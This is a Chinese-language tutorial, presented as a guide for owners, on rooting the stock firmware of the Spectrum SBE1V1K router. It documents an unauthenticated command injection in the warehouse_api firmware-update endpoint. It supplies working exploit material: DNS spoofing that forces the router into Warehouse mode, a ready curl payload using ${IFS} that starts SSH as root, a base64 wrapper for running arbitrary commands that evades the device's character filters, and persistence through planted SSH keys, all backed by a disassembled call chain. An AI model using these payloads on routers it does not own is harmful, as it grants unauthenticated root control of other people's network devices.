# SBE1V1K 原厂固件免拆机 Root 教程

## 1. 先说结论

本教程提供一条**免拆机、免串口、无需任何账号凭据**的原厂固件 root 路径：

- 漏洞位置：原厂 Web 接口 `/cgi-bin/warehouse_api` 的 `update_firmware` 命令。`firmware` 参数经过多层 shell/ELF 传递后进入 `popen()`，构成命令注入。
- 前提条件：设备处于 **Warehouse 模式**。只要控制设备 WAN 口接入的网络（提供 DHCP、IPv6 和一条自定义 DNS 记录）就能满足。
- 效果：一条 HTTPS POST 请求即可让设备以 root 身份启动 SSH（dropbear），SSH 密码就是设备序列号的大写。
- 已在原厂固件 SCP-5.4.x712.1.41118.1-r22（OpenWrt 19.07-SNAPSHOT r0+43-ac77edb2e）上验证。注入链每一环都经过源码阅读或反汇编逐条复核，见第 11、13 节。

本文目前只记录如何在原厂固件中免拆机取得 root，可用于备份 eMMC 或研究原厂固件。取得 root 后的刷机流程暂留空白，后续补充。

> 请只在你自己拥有的设备上执行本教程。

## 2. 路径选型：为什么用命令注入

针对这套固件分析过三条获取 root 的路径，只有第三条可行：

| 路径 | 思路 | 结论 |
|---|---|---|
| A. 定制固件刷入 | 修改 rootfs 后通过 `update_firmware` 刷入 | ❌ 固件为 U-Boot FIT 格式，带 RSA-2048/SHA256 签名（`/etc/sign.public.key`）和 ASKEY 证书链校验；没有私钥无法构造合法镜像 |
| B. OVSDB 注入 | 向 `Wifi_Test_Config` 表插入记录，触发 `dm` 守护进程调用 `system()` | ❌ 不是独立入口：OVSDB 只监听 Unix socket，必须先有 root 才能写入 |
| **C. `update_firmware` 命令注入** | `firmware` 参数经 shell/ELF 多层传递后进入 `popen()` | ✅ 本教程采用的路径 |

路径 C 的本质：固件升级流程用 `popen()`（等价于 `/bin/sh -c`）执行一条拼接了用户输入的 TFTP 命令字符串。

## 3. 准备工作

- 一台运行**原厂固件**的 SBE1V1K（SCP-5.4.x712.1，OpenWrt 19.07-SNAPSHOT）。
- 一个可控的测试网络：能提供 DHCP（IPv4）、IPv6（SLAAC）和自定义 DNS 记录，接设备 **WAN 口**。
- 一台执行命令的 PC（下文称操作机），接设备 **LAN 口**。
- 两根网线。

整体拓扑：

```text
测试网络 ──→ 设备 WAN 口          （提供 DHCP/IPv6/DNS，让设备进入 Warehouse 模式）
操作机   ──→ 设备 LAN 口          （访问 Web 接口、发送注入、SSH 登录）

设备上电 → Warehouse 模式 → 一条 HTTPS POST → SSH 连接 → root
```

⚠️ 两个连接缺一不可：

- 只有 WAN：设备能进 Warehouse 模式，但 Web 服务不监听 WAN 侧，无法发送注入。
- 只有 LAN：能访问 Web 服务，但设备处于 Cloud 模式，除 `get_mode` 外全部拒绝。

## 4. 步骤一：搭建测试网络（接 WAN 口）

设备启动时 `modecheck.sh` 要求 WAN 口同时获得 IPv4（DHCP）和全局 IPv6（SLAAC），并且 DNS 能解析 `warehouse.ctdi.local`。以下四种方式任选其一。

### 方式 A：普通家用路由器（最省事）

1. 登录路由器管理页面，找到 DNS 设置（可能叫"静态 DNS"、"Hosts"、"域名劫持"等）。
2. 添加记录：`warehouse.ctdi.local` → `10.0.0.1`（指向任意 IP 即可）。
3. 确认 IPv6 已开启（默认一般就是开的）。
4. 保存。用网线连接路由器 LAN 口 → SBE1V1K WAN 口。

### 方式 B：OpenWrt 路由器

```bash
ssh root@<OpenWrt设备IP>
uci add_list dhcp.@dnsmasq[0].address="/warehouse.ctdi.local/10.0.0.1"
uci set dhcp.lan.ra="server"          # IPv6 SLAAC，OpenWrt 默认已开启
uci commit dhcp
/etc/init.d/dnsmasq restart
```

用网线连接 OpenWrt 路由器 LAN 口 → SBE1V1K WAN 口。

### 方式 C：macOS 电脑

适合用一台 Mac 同时充当测试网络源；此时 Mac 还需要另一个网口（如 USB 网卡）接设备 LAN 口充当操作机，或另用一台电脑做操作机。

```bash
brew install dnsmasq
cat <<'EOF' >> /opt/homebrew/etc/dnsmasq.conf
interface=en0
bind-interfaces
port=53
dhcp-range=192.168.100.50,192.168.100.100,255.255.255.0,12h
dhcp-option=option:router,192.168.100.1
dhcp-option=option:dns-server,192.168.100.1
address=/warehouse.ctdi.local/10.0.0.1
enable-ra
dhcp-range=::1000,::2000,constructor:en0,ra-stateless,12h
EOF
sudo ifconfig en0 192.168.100.1 netmask 255.255.255.0
sudo dnsmasq -d -C /opt/homebrew/etc/dnsmasq.conf
```

### 方式 D：Linux 电脑

```bash
sudo apt install dnsmasq
cat <<'EOF' | sudo tee -a /etc/dnsmasq.conf
interface=eth0
bind-interfaces
dhcp-range=192.168.100.50,192.168.100.100,12h
dhcp-option=option:router,192.168.100.1
dhcp-option=option:dns-server,192.168.100.1
address=/warehouse.ctdi.local/10.0.0.1
enable-ra
dhcp-range=::1000,::2000,constructor:eth0,ra-stateless,12h
EOF
sudo ip addr add 192.168.100.1/24 dev eth0
sudo ip link set eth0 up
sudo systemctl stop systemd-resolved 2>/dev/null
sudo dnsmasq -d -C /etc/dnsmasq.conf
```

## 5. 步骤二：操作机接入 LAN 口

**为什么必须接 LAN：** 固件内 `vm` 守护进程调用 `/sbin/restart_webservice.sh br-home`，lighttpd 只绑定 br-home（LAN 网桥）的 IP；`/etc/config/firewall` 中 WAN 区 input 为 REJECT。WAN 侧访问不到 Web 接口。

1. 用网线连接操作机和 SBE1V1K 任意 **LAN 口**。
2. 设备自带 DHCP（地址池 192.168.1.100–249），操作机通常会自动获取地址。
3. 设备自身 IP 通常为 **192.168.1.1**；如果不同，以操作机获取到的默认网关为准。
4. 如果 DHCP 拿不到地址，给操作机手动配置 192.168.1.100/24。
5. 给 SBE1V1K 上电，等待 2–3 分钟完成启动。

## 6. 步骤三：确认 Warehouse 模式

在操作机执行：

```bash
curl -k https://192.168.1.1/cgi-bin/warehouse_api --data 'command=get_mode'
```

返回 `Warehouse` 表示条件满足。返回 `Cloud` 则回到第 4 节检查测试网络：DNS 记录是否生效、WAN 口是否同时拿到了 IPv4 和 IPv6。

## 7. 步骤四：发送注入命令，启用 SSH

在操作机执行：

```bash
curl -k 'https://192.168.1.1/cgi-bin/warehouse_api' \
  --data 'command=update_firmware&tftpserver=127.0.0.1&firmware=x;/bin/rm${IFS}-f${IFS}/tmp/update_attempt_file${IFS}/tmp/update_firmware_id;/etc/init.d/dropbear${IFS}start;:'
```

等待数秒到数分钟（见 7.3 的时序说明），然后验证 22 端口是否开放：

```bash
nc -z -v 192.168.1.1 22
```

### 7.1 Payload 逐段解释

| 片段 | 作用 |
|---|---|
| `command=update_firmware` | 触发固件升级流程 |
| `tftpserver=127.0.0.1` | 填任意 IP 即可；用 127.0.0.1 让 tftp 快速失败，无需真实 TFTP 服务器 |
| `firmware=x;...` | `x` 是占位文件名；`;` 之后是注入的命令 |
| `${IFS}` | **替代空格**，原因见 7.2 |
| `/bin/rm -f ...` | 清除升级尝试计数器，方便重复使用 |
| `/etc/init.d/dropbear start` | 启动 SSH 服务（核心目标） |
| 结尾的 `;:` | `:` 是 shell 空命令，用来吃掉拼接残留的参数 |

### 7.2 Payload 中不能出现空格（重要）

注入路径中有一层 `sscanf("%[^/]/%s", host, path)`（libopensync.so 偏移 0x175acc）。`%s` 在第一个空白字符处截断——payload 里的空格会让后面的内容全部丢失。

解决办法：用 `${IFS}` 代替空格。`${IFS}` 在到达最终的 `/bin/sh` 之前只是普通文本（不含空白，不会被截断），进入 `/bin/sh` 后才展开为空格/制表符并完成分词。

### 7.3 时序说明

`popen()` 实际执行的完整命令是：

```text
timeout 300 tftp -g -r x;rm ...;dropbear start;: -l /tmp/firmware.img 127.0.0.1 69
```

shell 顺序执行：`tftp` 先运行并失败（127.0.0.1 没有 TFTP 服务，通常几秒内结束，最坏 300 秒），**之后**注入的命令才执行。所以 curl 返回后 SSH 不一定立即可用，稍等再试。

另外 `fw_utils` 的重试循环会让同一条 payload 在一次请求里执行多次（retries=3 → 最多 4 次），重复执行 `dropbear start` 无害。

## 8. 步骤五：SSH 登录

root 密码是**设备序列号的大写**。序列号可以直接通过接口查询：

```bash
curl -k https://192.168.1.1/cgi-bin/warehouse_api --data 'command=get_serial'
```

然后登录：

```bash
ssh root@192.168.1.1
```

至此已免拆机取得 root。后续刷机流程待补充。

## 9. 步骤六（可选）：持久化

SSH 连入后执行：

```bash
/etc/init.d/dropbear enable                      # 开机自启
mkdir -p /etc/dropbear
echo "ssh-ed25519 AAAA...（你的公钥）..." > /etc/dropbear/authorized_keys
chmod 600 /etc/dropbear/authorized_keys
```

## 10. 构造自己的 Payload

> 所有 payload 必须**不含空格**（用 `${IFS}` 代替），并建议以 `;:` 结尾吃掉拼接残留的参数。

### 10.1 通用模式：base64 编码任意脚本（推荐）

base64 字符集不含空格和 `&`，天然绕过两个限制，脚本内部则可以有空格、`&`、引号：

```bash
# 1. 在本地编码任意脚本
echo '/etc/init.d/dropbear start
mkdir -p /etc/dropbear
echo "ssh-ed25519 AAAA..." > /etc/dropbear/authorized_keys' | base64 | tr -d '\n'
# 得到 BASE64 字符串

# 2. 发送
curl -k 'https://192.168.1.1/cgi-bin/warehouse_api' \
  --data 'command=update_firmware&tftpserver=127.0.0.1&firmware=x;echo${IFS}<BASE64>|base64${IFS}-d|sh;:'
```

执行链为 `echo BASE64 | base64 -d | sh`，脚本原样执行。第 9 节的持久化脚本就适合这样发送。

### 10.2 Payload 中确实需要 `&` 字符时

`warehouse_api` 用 `[^&]*` 提取参数，字面 `&` 会被截断。两种绕过方式：

1. 用 base64 模式（`&` 编码进 base64，不出现字面 `&`）。
2. 用命令替换生成：`$(printf${IFS}"\046")`。

## 11. 注入机制详解（已反汇编复核）

### 11.1 完整调用链

```text
POST firmware=x;CMD
│
├─ /www/cgi-bin/warehouse_api (ash)
│   sed 's/^.*firmware=\([^&]*\).*$/\1/p' 提取参数
│   ; $ () ` | 全部保留，只有 & 截断
│   以引号参数调用: /sbin/trigger_update_firmware "3" "x;CMD" "127.0.0.1" &
│
├─ /sbin/trigger_update_firmware (ash) 第 94 行
│   fw_utils --fw_upgrade tftp://$tftp_server/$absolute_image_file $retry_count
│   POSIX 规则：token 识别先于变量展开 → ; 是字面文本
│   展开后 "tftp://127.0.0.1/x;CMD" 作为单个 argv 传入
│
├─ fw_utils (ELF) main+0x22c @ 0x4032ec
│   校验 strncmp(argv[2], "tftp://", 7) == 0
│   fw_utils_upgrade(argv[2], atoi(argv[3])) @ 0x4062f0
│   重试循环调用 osp_upg_dl(url, 300, cb) @ 0x406340
│
└─ libask_osp_upg_dl (libopensync.so) @ 0x1758b8
    ├─ strncmp(url, "tftp://") @ 0x1759bc
    ├─ sscanf(url+7, "%[^/]/%s", host, path) @ 0x175acc
    │   ★ %s 在空白处截断 → payload 不能含空格，用 ${IFS} ★
    ├─ snprintf(cmd, 0x400,
    │     "timeout %u tftp -g -r %s -l %s %s %d",
    │     300, path, "/tmp/firmware.img", host, port) @ 0x175ccc
    ├─ popen(cmd, "r") @ 0x175d88   ← 注入点
    │   等价于 /bin/sh -c "timeout 300 tftp -g -r x;CMD -l ..."
    │   新 shell 重新解析 → ; 成为命令分隔符 → CMD 以 root 执行
    └─ pclose() @ 0x175dbc
```

### 11.2 可用的 shell 元字符（在 popen 层被新 shell 解析）

| 字符 | 用途 | 注意 |
|---|---|---|
| `;` | 命令分隔 | 首选 |
| `$(...)` | 命令替换 | 可用 |
| `` ` `` | 命令替换 | 可用 |
| `\|` | 管道 | 可用 |
| `>` `<` | 重定向 | 可用 |
| 空格 | 分词 | **禁止**——会被 sscanf 截断，用 `${IFS}` |
| `&` | 后台/逻辑与 | **禁止**——会被 warehouse_api 截断，用 base64 或 `$(printf${IFS}"\046")` |
| `:` | — | **禁止出现在 `/` 之前**——URL 解析会走 `host:port/path` 分支导致 path 为空、整个注入失效（base64 字符集天然不含 `:`，安全） |

### 11.3 静态证据（均可在固件中提取）

| 证据 | 位置 |
|---|---|
| `[^&]*` 提取正则 | `/www/cgi-bin/warehouse_api` L124–126 |
| L94 未加引号的变量拼接 | `/sbin/trigger_update_firmware` L94 |
| `osp_upg_dl` / `tftp://` 字符串 | `fw_utils` 符号表与 .rodata |
| `sscanf` 格式 `%[^:]:%d/%s`、`%[^/]/%s` | libopensync.so 0x1c159f / 0x1c15ab |
| `timeout %u tftp -g -r %s -l %s %s %d` | libopensync.so 0x1c160c |
| `popen@plt` 调用点 | libopensync.so 0x175d88 |
| `os_popen` = fork+execl("/bin/sh","sh","-c") | libopensync.so 0x8f290 |
| lighttpd 无降权（无 server.username/procd user） | `/etc/lighttpd/lighttpd.conf`、`/etc/init.d/lighttpd` |
| lighttpd 绑定 br-home | `/sbin/restart_webservice.sh`、`vm` 二进制 |

## 12. 故障排查

| 现象 | 原因与处理 |
|---|---|
| curl 连接失败/超时 | 操作机没接 LAN 口，或设备 IP 不是 192.168.1.1；确认拓扑：测试网络→WAN，操作机→LAN |
| `get_mode` 返回 `Cloud` | DNS 记录未生效或 WAN 缺 IPv6；检查测试网络配置 |
| `get_mode` 返回 `INVALID_REQUEST` | 用了 POST 之外的方法，或 body 为空 |
| 发送注入后 22 端口未开 | ① 等（tftp 部分先执行，最坏几分钟）② payload 里混入了空格（必须用 `${IFS}`）③ 混入了 `&` ④ 尝试计数器已满（payload 里带 `/bin/rm${IFS}-f${IFS}/tmp/update_attempt_file` 可解） |
| SSH 密码错误 | 密码是序列号**大写**，用 `get_serial` 确认 |
| 第二次注入无效 | 每启动周期最多 2 次尝试；payload 带 rm 计数器，或重启设备 |

## 13. 漏洞记录与复核方法

漏洞记录：

- **漏洞类型：** CWE-78 OS Command Injection（popen 层）
- **认证需求：** 无（`/cgi-bin/warehouse_api` 不在 lighttpd `auth.require` 范围内）
- **前提条件：** 设备处于 Warehouse 模式（控制其启动网络的 DNS 即可）
- **权限：** root（lighttpd 无降权配置）
- **影响设备：** Spectrum SBE1V1K 原厂固件
- **固件版本：** SCP-5.4.x712.1.41118.1-r22 / OpenWrt 19.07-SNAPSHOT r0+43-ac77edb2e

复核方法：

- shell 层（`warehouse_api`、`trigger_update_firmware`、`modecheck.sh`）：直接阅读源码。
- `fw_utils`、`libopensync.so`：使用 objdump 反汇编逐指令核对，关键地址见 11.1 调用链。
- 复核中发现并修正的两个问题：
  1. `sscanf %s` 空白截断 → payload 改用 `${IFS}`。
  2. lighttpd 仅绑定 br-home 且 WAN 防火墙 REJECT → 拓扑改为双连接（WAN 接测试网络，LAN 接操作机）。
